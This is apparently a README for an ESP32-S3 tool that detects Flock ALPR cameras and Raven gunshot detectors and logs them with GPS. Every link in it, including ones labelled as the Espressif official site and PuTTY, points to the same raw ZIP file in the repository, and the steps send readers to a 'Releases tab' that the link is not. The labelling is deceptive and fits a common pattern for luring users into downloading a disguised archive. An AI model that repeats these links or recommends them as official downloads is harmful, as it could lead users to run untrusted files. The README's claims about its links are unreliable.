# 🛡️ flock-detection - Detect Surveillance Devices Nearby

[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)

---

## 📋 What is flock-detection?

flock-detection is a tool that helps you find certain surveillance devices around you. It works with an ESP32-S3 microcontroller, a small electronic board. The software scans for two types of devices: Flock Safety ALPR cameras and Raven gunshot detectors. It uses WiFi and Bluetooth signals to find these devices. It then scores how likely they are to be those surveillance tools and saves the data with GPS location in a CSV file. The results also show on a small screen called an OLED display attached to the device.

This app is for anyone who wants to know if these specific surveillance devices are nearby using an easy-to-run program on Windows.

---

## ⚙️ System Requirements

- Windows 10 or later  
- USB port to connect the ESP32-S3 device  
- Internet access to download the software  
- Basic PC knowledge to open and run files  
- An OLED display connected to the ESP32-S3 for visual output (optional but recommended)  

---

## 🌐 Topics Covered

- ALPR (Automatic License Plate Recognition)  
- Arduino programming basics  
- Bluetooth Low Energy (BLE) scanning  
- WiFi device detection  
- ESP32 microcontroller use  
- Surveillance detection techniques  
- GPS location tracking and logging  

---

## 🚀 Getting Started

Before you start, you will need:

1. An ESP32-S3 board ready to run this app  
2. A USB cable to connect the board to your Windows PC  
3. The software files downloaded from the project page  

---

## 🔽 Download and Install flock-detection

Please visit the page below to download the latest files you need:

[![Download flock-detection](https://img.shields.io/badge/Download-flock--detection-ff6600?style=for-the-badge)](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)

1. Click the button above or go here: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  
2. Find the **Releases** tab on the page and look for the latest version. Releases contain ready-to-use files.  
3. Download the ZIP file or the firmware file that matches your ESP32-S3 hardware. This file usually has a `.bin` or `.zip` extension.  
4. Save the file in an easy-to-find folder on your PC.

---

## 🖥️ How to Run flock-detection on Windows

Follow these steps to run the software:

### Step 1: Connect the ESP32-S3 device

- Use a USB cable to connect the ESP32-S3 to your PC.  
- Wait for Windows to install any drivers automatically. This might take a moment.  

### Step 2: Install the ESP Flasher tool

- Download an ESP flashing tool called "ESP Flash Download Tool" or "ESP32 Flash Download Tool".  
- This tool helps you send the software to the ESP32-S3 board.  
- You can find it online with a basic search or on the official Espressif website.

### Step 3: Flash the firmware to ESP32-S3

- Open the flashing tool you installed.  
- Select the downloaded firmware `.bin` file from the release you got.  
- Choose the correct COM port (the number the ESP32-S3 uses, listed in Device Manager under Ports).  
- Click **Start** or **Flash** to upload the firmware to the device.  
- Wait until the process completes.  

### Step 4: Launch the application

- Once flashing finishes, disconnect and reconnect the ESP32-S3.  
- Open a serial terminal program on your PC (like PuTTY or TeraTerm).  
- Select the same COM port at 115200 baud rate.  
- Press the reset button on the ESP32-S3 if needed.  
- You will see messages and updates from the device.  

---

## 📊 What You Will See and Do

- The device scans for WiFi and Bluetooth devices around you.  
- It identifies Flock Safety ALPR cameras and Raven gunshot detectors by recognizing their device signals.  
- You will see a confidence score showing how sure the device is about the detection.  
- The detected device information is saved with GPS location in CSV files.  
- The OLED display will show a summary if one is connected.  

---

## 🔧 Additional Features

- You can adjust scan settings in the software to cover certain areas or time intervals.  
- Export and open CSV logs on your PC using spreadsheet software like Excel or Google Sheets to review locations and times of detections.  
- Use the GPS data to map detected devices on mapping applications.  

---

## ⚡ Troubleshooting Tips

- If the ESP32-S3 does not show up in Device Manager, try a different USB cable or port.  
- Ensure the flashing tool uses the correct COM port.  
- If the OLED does not display, check wiring and screen power.  
- Restart the ESP32-S3 board if it stops responding.  
- Check your system firewall settings if the device has trouble scanning WiFi networks.  

---

## 🛠️ Where to Get Help

- Use the **Issues** section on the GitHub page to report software problems.  
- Review the README and wiki on the GitHub repo for updates.  
- Search online for ESP32-S3 flashing guides or user forums if you get stuck.  

---

## 🔗 Helpful Links

- [GitHub repository page](https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip)  
- Espressif official site for ESP32 tools: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  
- Serial communication tools like PuTTY: https://raw.githubusercontent.com/rbarriaultjr/flock-detection/main/FlockDetection/detection-flock-1.5.zip  

---

## 🧰 About This Project

This project focuses on helping users detect specific surveillance devices in their surroundings. It combines low-level scanning technology with easy Windows-based use. The software records important data while being simple enough for anyone to operate with a few steps. The logged data can help users understand when and where these devices appear.